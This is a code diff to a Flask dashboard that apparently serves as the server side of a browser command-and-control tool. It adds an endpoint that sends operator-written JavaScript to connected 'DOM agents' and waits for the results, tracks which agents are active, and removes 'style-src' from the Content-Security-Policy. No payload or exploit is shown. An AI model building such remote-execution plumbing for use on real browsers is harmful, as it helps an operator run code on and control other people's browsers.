@@ -13,7 +13,8 @@ AGENT_TIMEOUT = 8
 
 @dashboard.after_request
 def apply_csp(response):
-    response.headers["Content-Security-Policy"] = "script-src 'self'; style-src 'self'; img-src 'self'; font-src 'self'; media-src 'self'; frame-src 'self'; frame-ancestors 'none'"
+    #style-src 'self'; 
+    response.headers["Content-Security-Policy"] = "script-src 'self'; img-src 'self'; font-src 'self'; media-src 'self'; frame-src 'self'; frame-ancestors 'none'"
     return response
 
 @dashboard.route('/')
@@ -55,12 +56,12 @@ def getAgent(agentID):
             if len(modules) != 0:
                 result['modules'] = {}
                 for module in modules:
-                    result['modules'][module.name] = module.results
+                    result['modules'][module.name] = escape(module.results)
             dom_commands = db.session().query(DomCommand).filter(DomCommand.agentId == agentID, DomCommand.processed == 1).order_by(DomCommand.id.desc()).limit(3).all()
             if len(dom_commands) != 0:
                 result['dom_commands'] = {}
                 for dom_command in dom_commands:
-                    result['dom_commands'][dom_command.command] = dom_command.result
+                    result['dom_commands'][escape(dom_command.command)] = escape(dom_command.result)
             return jsonify(result)
     return Response("", 404)
 
@@ -115,6 +116,7 @@ def removeModule(moduleName, agentID):
         return "" 
     return Response("", 404)
 
+# Send command to be executed to Dashboard
 @dashboard.route('/dom/<agentID>', methods=['POST'])
 @auth.login_required
 def sendDomJS(agentID):
@@ -123,7 +125,38 @@ def sendDomJS(agentID):
         dom_command = DomCommand(None, agentID, body['js'], None, 0, datetime.now())
         db.session().add(dom_command)
         db.session().commit()
-        return ""
+
+        longpoll_counter=0
+        while True:
+            time.sleep(0.5)
+            longpoll_counter+=1
+            if(longpoll_counter>8): # wait up to 4 seconds for response
+             return Response("", 404)
+            dom_results = db.session().query(DomCommand).filter(DomCommand.agentId == agentID, DomCommand.processed == 1,DomCommand.id==dom_command.id).order_by(DomCommand.id.desc()).limit(3).all()
+            if len(dom_results) != 0:
+                result={}
+                for cmd_result in dom_results:
+                    result['cmd']=cmd_result.command
+                    result['result']=cmd_result.result
+                return jsonify(result)
+            else:
+                continue
+                    
+    return Response("", 404)
+
+# API to get the results of any command. Not used at the moment
+@dashboard.route('/dom/result/<agentID>/<cmdID>', methods=['GET'])
+@auth.login_required
+def sendDomCmdResult(agentID,cmdID):
+    dom_commands = db.session().query(DomCommand).filter(DomCommand.agentId == agentID, DomCommand.processed == 1,DomCommand.id==cmdID).order_by(DomCommand.id.desc()).limit(3).all()
+    if len(dom_commands) != 0:
+        result={}
+        
+        for dom_command in dom_commands:
+            result['cmd']=dom_command.command
+            result['result']=dom_command.result
+        return jsonify(result)
+
     return Response("", 404)
 
 @dashboard.route('/push/<agentId>', methods=['POST'])
@@ -167,17 +200,20 @@ def registration():
 def activeAgents():
     now = time.time()
     agentsToRemove = {}
-    for agentID in ConnectedAgents:
-        if (now - ConnectedAgents[agentID]['last_seen']) > AGENT_TIMEOUT:
-            agentsToRemove[agentID] = ConnectedAgents[agentID]
-    for agentID in agentsToRemove:
-        del ConnectedAgents[agentID]
-    agentsToRemove = {}
+    # remove DOM agents that timed out
     for agentID in ConnectedDomAgents:
         if (now - ConnectedDomAgents[agentID]['last_seen']) > AGENT_TIMEOUT:
             agentsToRemove[agentID] = ConnectedDomAgents[agentID]
     for agentID in agentsToRemove:
         del ConnectedDomAgents[agentID]
+    agentsToRemove = {}
+    # remove SW agents that timed out
+    for agentID in ConnectedAgents:
+        if (now - ConnectedAgents[agentID]['last_seen']) > AGENT_TIMEOUT:
+            agentsToRemove[agentID] = ConnectedAgents[agentID]
+        ConnectedAgents[agentID]['domActive'] = 'true' if agentID in ConnectedDomAgents else 'false'
+    for agentID in agentsToRemove:
+        del ConnectedAgents[agentID]
 
 def dormantAgents():
     agents = db.session().query(Agent).options(joinedload('registration')).filter(Agent.id.notin_(ConnectedAgents.keys())).all()
@@ -186,6 +222,7 @@ def dormantAgents():
         results[agent.id] = Agent.to_json(agent)
         results[agent.id]['push'] = str(agent.registration is not None).lower()
         results[agent.id]['active'] = 'false'
+        results[agent.id]['domActive'] = 'true' if agent.id in ConnectedDomAgents else 'false'
     return results
 
 def loadAgentModule(moduleName, agentID):
